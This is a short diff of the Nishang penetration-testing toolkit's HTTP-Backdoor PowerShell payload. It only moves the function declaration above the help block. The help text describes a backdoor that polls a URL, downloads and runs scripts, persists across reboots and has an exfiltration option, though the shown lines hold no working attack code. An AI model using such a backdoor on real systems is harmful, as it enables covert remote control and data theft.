@@ -1,4 +1,9 @@
 
+
+
+
+function HTTP-Backdoor
+{
 <#
 .SYNOPSIS
 Nishang Payload which queries a URL for instructions and then downloads and executes a powershell script.
@@ -78,10 +83,7 @@ Use above for reboot persistence.
 http://labofapenetrationtester.com/
 https://github.com/samratashok/nishang
 #>
-
-
-function HTTP-Backdoor
-{
+    
     [CmdletBinding(DefaultParameterSetName="noexfil")] Param(
         [Parameter(Parametersetname="exfil")]
         [Switch]
